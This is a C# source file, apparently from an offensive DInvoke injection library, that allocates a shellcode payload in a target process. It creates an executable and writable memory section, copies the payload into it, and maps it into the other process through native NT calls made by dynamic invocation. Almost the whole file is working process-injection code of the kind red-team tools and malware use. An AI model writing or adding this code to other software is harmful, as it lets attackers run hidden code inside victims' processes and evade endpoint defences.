using System;
using System.Diagnostics;

namespace DInvoke.Injection
{
    /// <summary>
    /// Base class for allocation techniques.
    /// </summary>
    
    /// <summary>
    /// Allocates a payload to a target process using locally-written, remotely-copied shared memory sections.
    /// </summary>
    public class Allocation
    {
        /// <summary>
        /// Allocate the payload in the target process.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">The PIC payload to allocate to the target process.</param>
        /// <param name="Process">The target process.</param>
        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
        public static IntPtr Allocate(byte[] payload, Process Process)
        {
            // Get a convenient handle for the target process.
            IntPtr procHandle = Process.Handle;

            // Create a section to hold our payload
            IntPtr sectionAddress = CreateSection((uint)payload.Length, Data.Win32.WinNT.SEC_COMMIT);

            // Map a view of the section into our current process with RW permissions
            SectionDetails details = MapSection(Process.GetCurrentProcess().Handle, sectionAddress, Data.Win32.WinNT.PAGE_EXECUTE_READWRITE, IntPtr.Zero, Convert.ToUInt32(payload.Length));

            // Copy the shellcode to the local view
            System.Runtime.InteropServices.Marshal.Copy(payload, 0, details.baseAddr, payload.Length);

            // Now that we are done with the mapped view in our own process, unmap it
            Data.Native.NTSTATUS result = UnmapSection(Process.GetCurrentProcess().Handle, details.baseAddr);

            // Now, map a view of the section to process. It should already hold the payload.
            SectionDetails newDetails = MapSection(procHandle, sectionAddress, Data.Win32.WinNT.PAGE_EXECUTE_READWRITE, IntPtr.Zero, (ulong)payload.Length);

            return newDetails.baseAddr;
        }

        /// <summary>
        /// Creates a new Section.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="size">Max size of the Section.</param>
        /// <param name="allocationAttributes">Section attributes (eg. Win32.WinNT.SEC_COMMIT).</param>
        /// <returns></returns>
        private static IntPtr CreateSection(ulong size, uint allocationAttributes)
        {
            // Create a pointer for the section handle
            IntPtr SectionHandle = new IntPtr();
            ulong maxSize = size;

            Data.Native.NTSTATUS result = DynamicInvoke.Native.NtCreateSection(ref SectionHandle, 0x10000000, IntPtr.Zero, ref maxSize, Data.Win32.WinNT.PAGE_EXECUTE_READWRITE, allocationAttributes, IntPtr.Zero);
            // Perform error checking on the result
            if (result < 0)
            {
                return IntPtr.Zero;
            }
            return SectionHandle;
        }

        /// <summary>
        /// Maps a view of a section to the target process.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="procHandle">Handle the process that the section will be mapped to.</param>
        /// <param name="sectionHandle">Handle to the section.</param>
        /// <param name="protection">What permissions to use on the view.</param>
        /// <param name="addr">Optional parameter to specify the address of where to map the view.</param>
        /// <param name="sizeData">Size of the view to map. Must be smaller than the max Section size.</param>
        /// <returns>A struct containing address and size of the mapped view.</returns>
        public static SectionDetails MapSection(IntPtr procHandle, IntPtr sectionHandle, uint protection, IntPtr addr, ulong sizeData)
        {
            // Copied so that they may be passed by reference but the original value preserved
            IntPtr baseAddr = addr;
            ulong size = sizeData;

            uint disp = 2;
            uint alloc = 0;

            // Returns an NTSTATUS value
            Data.Native.NTSTATUS result = DynamicInvoke.Native.NtMapViewOfSection(sectionHandle, procHandle, ref baseAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref size, disp, alloc, protection);

            // Create a struct to hold the results.
            SectionDetails details = new SectionDetails(baseAddr, sizeData);

            return details;
        }


        /// <summary>
        /// Holds the data returned from NtMapViewOfSection.
        /// </summary>
        public struct SectionDetails
        {
            public IntPtr baseAddr;
            public ulong size;

            public SectionDetails(IntPtr addr, ulong sizeData)
            {
                baseAddr = addr;
                size = sizeData;
            }
        }

        /// <summary>
        /// Unmaps a view of a section from a process.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="hProc">Process to which the view has been mapped.</param>
        /// <param name="baseAddr">Address of the view (relative to the target process)</param>
        /// <returns></returns>
        public static Data.Native.NTSTATUS UnmapSection(IntPtr hProc, IntPtr baseAddr)
        {
            return DynamicInvoke.Native.NtUnmapViewOfSection(hProc, baseAddr);
        }
    }
}
